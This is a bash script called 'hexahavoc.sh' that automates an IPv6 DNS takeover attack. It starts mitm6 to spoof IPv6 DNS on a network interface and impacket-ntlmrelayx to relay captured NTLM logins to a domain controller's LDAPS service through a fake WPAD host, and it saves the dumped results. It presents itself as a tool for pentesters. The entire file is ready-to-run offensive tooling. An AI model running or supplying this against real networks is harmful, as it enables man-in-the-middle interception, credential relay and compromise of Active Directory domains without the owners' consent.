#!/bin/bash

# ===============================================================
# hexahavoc.sh - IPv6 DNS Takeover Automation Script
# ---------------------------------------------------------------
# This script automates the setup of an IPv6 DNS takeover attack 
# using mitm6 and impacket-ntlmrelayx, leveraging tmux to manage 
# the session. Designed for network administrators and pentesters
# to identify potential vulnerabilities in IPv6 DNS handling.
#
# Author: Howell King Jr. | Github: https://github.com/sp3ttr0
# ===============================================================

# Define color variables
RED="\033[31m"
GREEN="\033[32m"
YELLOW="\033[33m"
CYAN="\033[36m"
RESET="\033[0m"

# Define log file
log_file="hexahavoc_$(date '+%Y%m%d_%H%M%S').log"

# Redirect output to log file and console
exec > >(tee -a "$log_file") 2>&1

# Check if a command exists
check_command() {
  if ! command -v "$1" &> /dev/null; then
    echo -e "${RED}Error: $1 is not installed. Please install it before running this script.${RESET}"
    exit 1
  fi
}

# Print usage information
usage() {
  echo -e "${CYAN}Usage: $0 -d <target_domain> -t <target_ip> [-i <interface>] [-v] [-o <impacket_options>] [-s]${RESET}"
  echo -e "${YELLOW}Options:${RESET}"
  echo -e "  -d  Specify the target domain"
  echo -e "  -t  Specify the target IP"
  echo -e "  -i  Specify the network interface (default: eth0)"
  echo -e "  -v  Enable verbose logging"
  echo -e "  -o  Additional options for impacket-ntlmrelayx"
  echo -e "  -s  Enable silent mode (suppress console output)"
  exit 1
}

# Initialize variables with default values
target_domain=""
target_ip=""
interface="eth0"
verbose=0
silent=0
impacket_options=""
session_name="ipv6_dns_takeover_$(date '+%H%M%S')"
dumps_dir="dumps"

# Parse command-line arguments
while getopts ":d:t:i:vo:s" opt; do
  case "$opt" in
    d) target_domain="$OPTARG" ;;
    t) target_ip="$OPTARG" ;;
    i) interface="$OPTARG" ;;
    v) verbose=1 ;;
    o) impacket_options="$OPTARG" ;;
    s) silent=1 ;;
    \?) usage ;;
  esac
done

# Ensure required arguments are provided
if [ -z "$target_domain" ] || [ -z "$target_ip" ]; then
  echo -e "${RED}Error: Both -d (target_domain) and -t (target_ip) arguments are required.${RESET}"
  usage
fi

# Validate target domain
if ! [[ "$target_domain" =~ ^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$ ]]; then
  echo -e "${RED}Error: Invalid domain format.${RESET}"
  exit 1
fi

# Validate target IP (basic check for IPv4/IPv6)
if ! [[ "$target_ip" =~ ^[0-9a-fA-F:.]+$ ]]; then
  echo -e "${RED}Error: Invalid IP address format.${RESET}"
  exit 1
fi

# Check if target IP is reachable
ping6 -c 1 "$target_ip" &>/dev/null || {
  echo -e "${RED}Error: Target IP is not reachable.${RESET}"
  exit 1
}

# Check dependencies
echo -e "${CYAN}Checking dependencies...${RESET}"
check_command "tmux"
check_command "mitm6"
check_command "impacket-ntlmrelayx"

# Enable verbose logging if requested
if [ "$verbose" -eq 1 ]; then
  echo -e "${YELLOW}Enabling verbose mode...${RESET}"
  set -x
fi

# Suppress console output if silent mode is enabled
if [ "$silent" -eq 1 ]; then
  exec > /dev/null 2>&1
fi

# Cleanup function
clean_up() {
  echo -e "${CYAN}Cleaning up temporary files and sessions...${RESET}"
  rm -rf "$dumps_dir"
  tmux kill-session -t "$session_name" 2>/dev/null
  kill $(jobs -p) 2>/dev/null
}
trap clean_up EXIT INT

# Check if the tmux session already exists
echo -e "${CYAN}Checking if the tmux session '$session_name' already exists...${RESET}"
if tmux has-session -t "$session_name" 2>/dev/null; then
  echo -e "${GREEN}Session exists. Attaching...${RESET}"
  tmux -CC attach-session -t "$session_name"
  exit 0
fi

# Create a new tmux session
echo -e "${CYAN}Creating a new tmux session named '$session_name'...${RESET}"
tmux new-session -d -s "$session_name"

# Function to start a tmux window
start_tmux_window() {
  local session_name=$1
  local window_name=$2
  local command=$3
  tmux new-window -t "$session_name" -n "$window_name"
  tmux send-keys -t "$session_name:$window_name" "$command" C-m
}

# Start mitm6 in tmux session
echo -e "${CYAN}Starting mitm6 on interface $interface for domain $target_domain...${RESET}"
start_tmux_window "$session_name" "mitm6" "mitm6 -i $interface -d $target_domain" || {
  echo -e "${RED}Failed to start mitm6.${RESET}"
  exit 1
}

# Start impacket-ntlmrelayx in tmux session
echo -e "${CYAN}Starting impacket-ntlmrelayx...${RESET}"
start_tmux_window "$session_name" "impacket-ntlmrelayx" "impacket-ntlmrelayx -6 -t ldaps://$target_ip -wh fakewpad.$target_domain -l $dumps_dir $impacket_options" || {
  echo -e "${RED}Failed to start impacket-ntlmrelayx.${RESET}"
  exit 1
}

# Create dumps directory if it doesn't exist
if [ ! -d "$dumps_dir" ]; then
  mkdir -p "$dumps_dir"
else
  echo -e "${YELLOW}Warning: Dumps directory already exists. Results may be overwritten.${RESET}"
fi

# Attach to the tmux session
echo -e "${GREEN}Attaching to the tmux session '$session_name'...${RESET}"
tmux -CC attach-session -t "$session_name"

# Disable verbose logging
if [ "$verbose" -eq 1 ]; then
  echo -e "${YELLOW}Disabling verbose mode...${RESET}"
  set +x
fi

# Display summary
echo -e "${GREEN}Setup complete.${RESET}"
echo -e "${CYAN}Session Name: ${RESET}${session_name}"
echo -e "${CYAN}Target Domain: ${RESET}${target_domain}"
echo -e "${CYAN}Target IP: ${RESET}${target_ip}"
echo -e "${CYAN}Log File: ${RESET}${log_file}"

exit 0
